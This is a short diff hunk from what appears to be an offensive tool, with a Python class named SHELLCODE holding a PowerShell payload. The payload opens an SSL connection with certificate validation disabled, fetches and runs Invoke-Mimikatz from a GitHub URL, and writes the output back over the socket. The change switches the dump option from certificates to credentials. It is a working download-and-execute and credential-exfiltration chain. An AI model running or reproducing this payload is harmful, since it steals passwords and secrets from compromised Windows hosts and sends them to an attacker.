@@ -195,7 +195,7 @@ class SHELLCODE(object):
         "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
         "$ssl.AuthenticateAsClient($env:computername);"
         "IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\");"
-        "$o = (Invoke-Mimikatz -DumpCerts);"
+        "$o = (Invoke-Mimikatz -DumpCreds);"
         "$send = ([text.encoding]::ASCII).GetBytes($o);"
         "$ssl.Write($send,0,$send.Length);")
 
